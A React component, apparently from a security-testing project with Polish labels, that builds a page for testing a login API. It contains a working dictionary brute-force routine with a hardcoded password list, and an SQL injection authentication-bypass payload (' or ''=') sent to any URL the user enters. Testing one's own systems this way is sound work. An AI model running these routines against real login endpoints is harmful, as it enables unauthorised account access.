import React, {useState} from 'react';
import styled from "styled-components";
import axios from "axios";
import TextInput from "../components/TextInput/TextInput";
import Button from "../components/Button/Button";

const StyledContainer = styled.div`
  display: flex;
  align-items: center;
  flex-direction: column;
  margin-bottom: 50px;
  margin-top: 40px;
`;

const FormContainer = styled.div`
  display: flex;
  flex-direction: column;
  width: 500px;
  border-radius: 20px;
  border: 1px solid #282c34;
  align-items: center;
  padding-bottom: 20px;
`;

const InputWrapper = styled.div`
  width: 80%;
  margin-top: 16px;
  text-align: center;
`;

const SQLInputWrapper = styled.div`
  width: 80%;
  margin-top: 50px;
  text-align: center;
`;

const PageTitle = styled.h1`
  font-size: 30px;
  font-weight: bold;
`;

const GreenLabel = styled.p`
  font-size: 20px;
  color: green;
  font-weight: bold;
  margin-top: 8px;
  margin-bottom: 8px;
`;

const AuthenticationTests = props => {
    const [pageUrl, setPageUrl] = useState('http://localhost:8080/login');
    const [login, setLogin] = useState('');
    const [passwordFound, setPasswordFound] = useState(null);
    const [searchTime, setSearchTime] = useState(null);
    const [isLoading, setIsLoading] = useState(false);
    const [isLoadingSQL, setIsLoadingSQL] = useState(false);
    const [sqlInjectionStatus, setSqlInjectionStatus] = useState(null);
    const [sqlCommand, setSqlCommand] = useState("' or ''='");
    const [userNameFieldName, setUserNameFieldName] = useState('username');
    const [passwordFieldName, setPasswordFieldName] = useState('password');

    const passwords = ['asdf', 'qwertt', 'vbnf', 'popop','asflkj', 'dfvebrbb', 'dfowioerfjio', 'bwenngto', 'vfkvnee', 'davrwtireogge', 'csidjcviodsjv', 'dawid', 'janek'];

    const loginToSystem = () => {
        setIsLoading(true);
        let start = performance.now();
        passwords.forEach(passwd => {
            axios.post(`${pageUrl}`, {
                [userNameFieldName]: login,
                [passwordFieldName]: passwd
            }).then(res => {
                if (res.status === 200) {
                    let end = performance.now();
                    console.log(res.status)
                    setPasswordFound(passwd);
                    setSearchTime(end - start);
                    setIsLoading(false);
                }
            })
        })
    }

    const sqlInjection = () => {
        setIsLoadingSQL(true);
        axios.post(`${pageUrl}`, {
            [userNameFieldName]: login,
            [passwordFieldName]: sqlCommand
        }).then(res => {
            if (res.status === 200) {
                setSqlInjectionStatus(`Udało się zalogować za pomocą SQL Injection ${JSON.stringify(res.data)}`)
            }
        }).finally(() => setIsLoadingSQL(false))
    }


    return (
        <StyledContainer>
            <PageTitle>Brute Force & SQL Injection</PageTitle>
            <FormContainer>
                <InputWrapper>
                    API URL
                    <TextInput
                        onChange={(e) => setPageUrl(e.target.value)}
                        type={'text'}
                        name={'url'}
                        placeholder={'Podaj URL do API logowania'}
                        value={pageUrl}
                    />
                </InputWrapper>
                <InputWrapper>
                    Login
                    <TextInput
                        onChange={(e) => setLogin(e.target.value)}
                        type={'text'}
                        name={'url'}
                        placeholder={'Podaj login'}
                    />
                </InputWrapper>
                <InputWrapper>
                    Nazwa pola loginu
                    <TextInput
                        value={userNameFieldName}
                        onChange={(e) => setUserNameFieldName(e.target.value)}
                        type={'text'}
                        name={'url'}
                        placeholder={'Podaj nazwę pola loginu'}
                    />
                </InputWrapper>
                <InputWrapper>
                    Nazwa pola hasła
                    <TextInput
                        value={passwordFieldName}
                        onChange={(e) => setPasswordFieldName(e.target.value)}
                        type={'text'}
                        name={'url'}
                        placeholder={'Podaj nazwę pola hasła'}
                    />
                </InputWrapper>
                <InputWrapper>
                    {isLoading ? (
                        <span>Proszę czekać ...</span>
                    ) : (
                        <Button disabled={login === ''} onClick={() => loginToSystem()}>
                            Znajdź hasło
                        </Button>
                    )}
                </InputWrapper>
                {passwordFound && (
                    <GreenLabel>Znalezione hasło: {passwordFound}</GreenLabel>
                )}
                {searchTime && (
                    <span>czas wyszukiwania: {(searchTime / 1000).toFixed(2)} sekund</span>
                )}
                <SQLInputWrapper>
                    Sprawdzanie podatności na ataki SQL Injection
                    <TextInput
                        onChange={(e) => setSqlCommand(e.target.value)}
                        type={'text'}
                        name={'url'}
                        placeholder={'Podaj kod SQL'}
                        value={sqlCommand}
                    />
                </SQLInputWrapper>
                <InputWrapper>
                    {isLoadingSQL ? (
                        <span>Proszę czekać ...</span>
                    ) : (
                        <Button onClick={() => sqlInjection()}>
                            SQL Injection
                        </Button>
                    )}
                    {sqlInjectionStatus && (
                        <GreenLabel>{sqlInjectionStatus}</GreenLabel>
                    )}
                </InputWrapper>
            </FormContainer>
        </StyledContainer>
    );
};

export default AuthenticationTests;
